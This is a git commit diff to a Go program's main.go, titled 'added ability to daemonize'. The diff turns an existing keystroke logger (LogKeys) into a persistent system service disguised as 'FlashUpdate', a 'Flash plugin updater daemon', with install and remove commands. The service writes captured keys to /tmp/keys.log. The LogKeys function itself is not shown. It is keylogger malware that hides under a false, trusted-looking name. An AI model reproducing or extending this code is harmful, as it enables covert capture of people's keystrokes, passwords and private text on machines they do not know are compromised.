c528510ce41998e1215423705b7742ccebbfdae2
Chris <chris@mode.chr1s.co>
2015-10-30 01:14:11 -0400

    added ability to daemonize

--- main.go
+++ main.go
@@ -1,7 +1,61 @@
 package main
 
-import "os"
+import (
+	"log"
+	"os"
+
+	"github.com/takama/daemon"
+)
 
 func main() {
-	LogKeys(os.Stdout)
+	cmd := "run"
+	if len(os.Args) > 1 {
+		cmd = os.Args[1]
+	}
+
+	service, err := daemon.New("FlashUpdate", "Flash plugin updater daemon")
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	if cmd == "install" {
+		_, err := service.Install()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		_, err = service.Start()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		os.Exit(0)
+
+	} else if cmd == "remove" {
+
+		_, err := service.Stop()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		_, err = service.Remove()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		os.Exit(0)
+
+	} else if cmd == "help" {
+		log.Println("Possible Commands: install remove help run")
+	} else {
+
+		out, err := os.OpenFile("/tmp/keys.log", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer out.Close()
+		LogKeys(out)
+
+		os.Exit(0)
+	}
 }
